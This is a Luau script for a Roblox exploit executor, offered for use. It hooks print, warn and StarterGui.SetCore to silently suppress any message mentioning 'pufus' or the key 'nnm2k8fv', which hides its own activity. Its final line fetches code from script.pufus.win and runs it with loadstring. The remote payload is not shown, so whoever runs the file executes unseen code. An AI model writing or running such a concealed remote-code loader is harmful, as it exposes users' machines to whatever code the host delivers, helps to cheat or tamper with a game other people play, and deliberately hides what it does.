local KEYS = { "pufus", "nnm2k8fv" }
local StarterGui = game:GetService("StarterGui")

local function has_key(v)
	if type(v) ~= "string" then return false end
	local s = string.lower(v)
	for _, k in ipairs(KEYS) do
		if string.find(s, k, 1, true) then return true end
	end
	return false
end

local function args_have_key(...)
	for i = 1, select("#", ...) do
		local v = select(i, ...)
		if has_key(v) then return true end
		if type(v) == "table" then
			for _, x in pairs(v) do
				if has_key(x) then return true end
			end
		end
	end
	return false
end

local old_print = clonefunction(print)
hookfunction(print, newcclosure(function(...)
	if args_have_key(...) then return end
	return old_print(...)
end))

local old_warn = clonefunction(warn)
hookfunction(warn, newcclosure(function(...)
	if args_have_key(...) then return end
	return old_warn(...)
end))

local old_setcore = clonefunction(StarterGui.SetCore)
hookfunction(StarterGui.SetCore, newcclosure(function(self, name, ...)
	if args_have_key(...) then return end
	return old_setcore(self, name, ...)
end))
loadstring(game:HttpGet("https://script.pufus.win/nnm2k8fv"))()
